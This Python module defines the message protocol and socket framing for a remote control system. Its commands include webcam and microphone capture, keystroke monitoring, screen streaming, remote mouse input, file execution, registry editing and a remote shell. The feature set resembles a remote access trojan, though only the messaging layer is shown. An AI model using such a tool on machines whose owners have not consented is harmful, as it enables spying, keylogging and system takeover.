"""
通信协议定义 - 远程控制系统
定义客户端和服务器之间的消息格式和协议
"""

import json
import struct
import socket

# ==================== 消息类型常量 ====================
class MessageType:
    """消息类型枚举"""
    AUTH = 'AUTH'                    # 身份验证
    AUTH_RESPONSE = 'AUTH_RESPONSE'  # 身份验证响应
    SCREENSHOT = 'SCREENSHOT'        # 截图请求
    SCREENSHOT_DATA = 'SCREENSHOT_DATA'  # 截图数据
    CAMERA = 'CAMERA'                # 摄像头拍照请求
    CAMERA_DATA = 'CAMERA_DATA'      # 摄像头照片数据
    VIDEO_START = 'VIDEO_START'      # 开始视频流
    VIDEO_STOP = 'VIDEO_STOP'        # 停止视频流
    VIDEO_FRAME = 'VIDEO_FRAME'      # 视频帧数据
    RECORD_START = 'RECORD_START'    # 开始录像
    RECORD_STOP = 'RECORD_STOP'      # 停止录像
    RECORD_STATUS = 'RECORD_STATUS'  # 录像状态响应
    FILE_DOWNLOAD = 'FILE_DOWNLOAD'  # 文件下载请求
    FILE_DATA = 'FILE_DATA'          # 文件数据
    FILE_UPLOAD = 'FILE_UPLOAD'      # 文件上传请求
    FILE_UPLOAD_RESPONSE = 'FILE_UPLOAD_RESPONSE'  # 文件上传响应
    FILE_EXECUTE = 'FILE_EXECUTE'    # 文件执行请求
    FILE_EXECUTE_RESPONSE = 'FILE_EXECUTE_RESPONSE'  # 文件执行响应
    REGISTRY_QUERY = 'REGISTRY_QUERY'    # 注册表查询
    REGISTRY_SET = 'REGISTRY_SET'        # 注册表设置
    REGISTRY_DELETE = 'REGISTRY_DELETE'  # 注册表删除
    REGISTRY_RESPONSE = 'REGISTRY_RESPONSE'  # 注册表操作响应
    SYSTEM_INFO = 'SYSTEM_INFO'      # 系统信息请求
    SYSTEM_INFO_RESPONSE = 'SYSTEM_INFO_RESPONSE'  # 系统信息响应
    MIC_RECORD = 'MIC_RECORD'        # 麦克风录音请求 (服务器录制并返回音频)
    MIC_RECORD_RESPONSE = 'MIC_RECORD_RESPONSE'  # 麦克风录音响应
    SCREEN_START = 'SCREEN_START'    # 屏幕实时查看开始
    SCREEN_STOP = 'SCREEN_STOP'      # 屏幕实时查看停止
    SCREEN_FRAME = 'SCREEN_FRAME'    # 屏幕帧数据
    MOUSE_EVENT = 'MOUSE_EVENT'      # 鼠标事件 (move/click/scroll)
    MOUSE_EVENT_RESPONSE = 'MOUSE_EVENT_RESPONSE'  # 鼠标事件响应
    KEYBOARD_MONITOR_START = 'KEYBOARD_MONITOR_START'  # 开始键盘监控
    KEYBOARD_MONITOR_STOP = 'KEYBOARD_MONITOR_STOP'    # 停止键盘监控
    KEYBOARD_EVENT = 'KEYBOARD_EVENT'                  # 键盘事件数据
    SHELL = 'SHELL'                  # Shell交互请求
    SHELL_RESPONSE = 'SHELL_RESPONSE'  # Shell交互响应
    SHELL_EXIT = 'SHELL_EXIT'        # 退出Shell模式
    DISCONNECT = 'DISCONNECT'        # 断开连接
    ERROR = 'ERROR'                  # 错误消息
    HEARTBEAT = 'HEARTBEAT'          # 心跳包

# ==================== 协议函数 ====================

def create_message(msg_type, data=None):
    """
    创建协议消息
    
    Args:
        msg_type: 消息类型（来自 MessageType）
        data: 消息数据（字典）
    
    Returns:
        dict: 消息字典
    """
    message = {
        'type': msg_type,
        'data': data or {}
    }
    return message


def encode_message(message):
    """
    编码消息为字节流（带长度前缀）
    
    Args:
        message: 消息字典
    
    Returns:
        bytes: 编码后的字节流
    """
    # 将消息转换为 JSON 字符串
    json_str = json.dumps(message, ensure_ascii=False)
    json_bytes = json_str.encode('utf-8')
    
    # 添加 4 字节长度前缀（大端序）
    length = len(json_bytes)
    length_prefix = struct.pack('>I', length)
    
    return length_prefix + json_bytes


def decode_message(data):
    """
    解码消息字节流
    
    Args:
        data: 字节流数据
    
    Returns:
        dict: 解码后的消息字典
    """
    json_str = data.decode('utf-8')
    message = json.loads(json_str)
    return message


def send_message(sock, message):
    """
    发送消息到套接字
    
    Args:
        sock: socket 对象
        message: 消息字典
    
    Returns:
        bool: 是否发送成功
    """
    try:
        encoded = encode_message(message)
        sock.sendall(encoded)
        return True
    except Exception as e:
        print(f"发送消息失败: {e}")
        return False


def receive_message(sock):
    """
    从套接字接收消息
    
    Args:
        sock: socket 对象
    
    Returns:
        dict: 接收到的消息字典，失败返回 None
    """
    try:
        # 首先接收 4 字节长度前缀
        length_data = recv_exact(sock, 4)
        if not length_data:
            return None
        
        # 解析长度
        length = struct.unpack('>I', length_data)[0]
        
        # 检测异常的长度值(可能是二进制数据)
        if length > 10 * 1024 * 1024:  # 超过10MB
            print(f"[警告] 接收到异常的消息长度: {length} 字节,可能是数据错乱")
            print(f"[警告] 长度前缀原始字节: {length_data.hex()}")
            return None
        
        # 接收指定长度的数据
        message_data = recv_exact(sock, length)
        if not message_data:
            return None
        
        # 解码消息
        try:
            message = decode_message(message_data)
            return message
        except UnicodeDecodeError as ude:
            print(f"[错误] 接收到的数据不是有效的UTF-8文本")
            print(f"[错误] 数据开头: {message_data[:20].hex()}")
            print(f"[错误] 这可能是视频流残留数据,请确保视频流已完全停止")
            return None
    
    except Exception as e:
        print(f"接收消息失败: {e}")
        return None


def recv_exact(sock, n):
    """
    精确接收n个字节
    
    Args:
        sock: socket 对象
        n: 要接收的字节数
    
    Returns:
        bytes: 接收到的n个字节，失败返回 None
    """
    data = b''
    
    while len(data) < n:
        try:
            remaining = n - len(data)
            chunk = sock.recv(min(remaining, 8192))  # 每次最多接收8KB
            
            if not chunk:
                return None
            
            data += chunk
                
        except socket.timeout:
            return None
        except Exception:
            return None
    
    return data


def send_binary_data(sock, data, chunk_size=4096):
    """
    发送二进制数据（用于文件传输、截图等）
    
    Args:
        sock: socket 对象
        data: 二进制数据
        chunk_size: 每次发送的块大小
    
    Returns:
        bool: 是否发送成功
    """
    try:
        # 先发送数据总长度
        length = len(data)
        length_prefix = struct.pack('>I', length)
        sock.sendall(length_prefix)
        
        # 分块发送数据
        offset = 0
        while offset < length:
            chunk = data[offset:offset + chunk_size]
            sock.sendall(chunk)
            offset += chunk_size
        
        return True
    
    except Exception as e:
        print(f"发送二进制数据失败: {e}")
        return False


def receive_binary_data(sock):
    """
    接收二进制数据
    
    Args:
        sock: socket 对象
    
    Returns:
        bytes: 接收到的二进制数据，失败返回 None
    """
    try:
        # 接收数据总长度
        length_data = recv_exact(sock, 4)
        if not length_data:
            return None
        
        length = struct.unpack('>I', length_data)[0]
        
        # 接收所有数据
        data = recv_exact(sock, length)
        return data
    
    except Exception as e:
        print(f"接收二进制数据失败: {e}")
        return None


# ==================== 消息创建辅助函数 ====================

def create_auth_message(password_hash):
    """创建身份验证消息"""
    return create_message(MessageType.AUTH, {'password_hash': password_hash})


def create_auth_response(success, message=''):
    """创建身份验证响应消息"""
    return create_message(MessageType.AUTH_RESPONSE, {
        'success': success,
        'message': message
    })


def create_screenshot_message():
    """创建截图请求消息"""
    return create_message(MessageType.SCREENSHOT)


def create_camera_message():
    """创建摄像头拍照请求消息"""
    return create_message(MessageType.CAMERA)


def create_video_start_message(width=640, height=480, fps=30, quality=85):
    """创建开始视频流消息"""
    return create_message(MessageType.VIDEO_START, {
        'width': width,
        'height': height,
        'fps': fps,
        'quality': quality
    })


def create_video_stop_message():
    """创建停止视频流消息"""
    return create_message(MessageType.VIDEO_STOP)


def create_record_start_message(filename=None):
    """创建开始录像消息"""
    return create_message(MessageType.RECORD_START, {'filename': filename})


def create_record_stop_message():
    """创建停止录像消息"""
    return create_message(MessageType.RECORD_STOP)


def create_file_download_message(filepath):
    """创建文件下载请求消息"""
    return create_message(MessageType.FILE_DOWNLOAD, {'filepath': filepath})

def create_file_upload_message(filepath, filename):
    """创建文件上传请求消息"""
    return create_message(MessageType.FILE_UPLOAD, {
        'filepath': filepath,
        'filename': filename
    })

def create_file_execute_message(filepath, args=''):
    """创建文件执行请求消息"""
    return create_message(MessageType.FILE_EXECUTE, {
        'filepath': filepath,
        'args': args
    })

def create_registry_query_message(hive, key_path, name=None):
    """创建注册表查询请求

    hive: 字符串, 如 'HKLM' 或 'HKCU'
    key_path: 键路径, 如 'SOFTWARE\\MyApp'
    name: 值名称, 如果为 None 则返回所有值
    """
    return create_message(MessageType.REGISTRY_QUERY, {
        'hive': hive,
        'key_path': key_path,
        'name': name
    })

def create_registry_set_message(hive, key_path, name, value, value_type='REG_SZ'):
    """创建注册表设置请求

    value_type: 字符串, 常用 'REG_SZ','REG_DWORD'
    """
    return create_message(MessageType.REGISTRY_SET, {
        'hive': hive,
        'key_path': key_path,
        'name': name,
        'value': value,
        'value_type': value_type
    })

def create_registry_delete_message(hive, key_path, name=None):
    """创建注册表删除请求

    如果 name 为 None, 删除整个键
    """
    return create_message(MessageType.REGISTRY_DELETE, {
        'hive': hive,
        'key_path': key_path,
        'name': name
    })

def create_mic_record_message(duration=5, samplerate=44100, channels=1):
    """创建麦克风录音请求消息

    duration: 录音时长(秒)
    samplerate: 采样率
    channels: 通道数

    注: 为避免依赖外部编码器, 该请求仅支持在服务器端录制原始 WAV 并返回 WAV 字节。
    """
    return create_message(MessageType.MIC_RECORD, {
        'duration': duration,
        'samplerate': samplerate,
        'channels': channels
    })


def create_screen_start_message(region=None, fps=10, quality=70):
    """创建屏幕实时查看开始消息

    region: None 或 dict {'left':..,'top':..,'width':..,'height':..}，None 表示全屏
    fps: 帧率
    quality: JPEG质量
    """
    return create_message(MessageType.SCREEN_START, {
        'region': region,
        'fps': fps,
        'quality': quality
    })


def create_screen_stop_message():
    return create_message(MessageType.SCREEN_STOP)


def create_mouse_event_message(event_type, x=None, y=None, button='left', clicks=1, dx=0, dy=0):
    """创建鼠标事件消息

    event_type: 'move'|'click'|'scroll'
    x,y: 坐标（屏幕坐标）
    button: 'left'|'right'|'middle'
    clicks: 点击次数
    dx,dy: 滚动或相对移动增量
    """
    return create_message(MessageType.MOUSE_EVENT, {
        'event': event_type,
        'x': x,
        'y': y,
        'button': button,
        'clicks': clicks,
        'dx': dx,
        'dy': dy
    })


def create_keyboard_monitor_start_message():
    """创建开始键盘监控消息"""
    return create_message(MessageType.KEYBOARD_MONITOR_START)


def create_keyboard_monitor_stop_message():
    """创建停止键盘监控消息"""
    return create_message(MessageType.KEYBOARD_MONITOR_STOP)


def create_keyboard_event_message(key, event_type, timestamp):
    """创建键盘事件消息

    key: 按键名称或字符
    event_type: 'press' | 'release'
    timestamp: 时间戳
    """
    return create_message(MessageType.KEYBOARD_EVENT, {
        'key': key,
        'event_type': event_type,
        'timestamp': timestamp
    })


def create_system_info_message():
    """创建系统信息请求消息"""
    return create_message(MessageType.SYSTEM_INFO)


def create_shell_message(command, working_dir=None):
    """创建Shell命令消息"""
    return create_message(MessageType.SHELL, {
        'command': command,
        'working_dir': working_dir
    })


def create_shell_exit_message():
    """创建退出Shell模式消息"""
    return create_message(MessageType.SHELL_EXIT)


def create_disconnect_message():
    """创建断开连接消息"""
    return create_message(MessageType.DISCONNECT)


def create_error_message(error_message):
    """创建错误消息"""
    return create_message(MessageType.ERROR, {'message': error_message})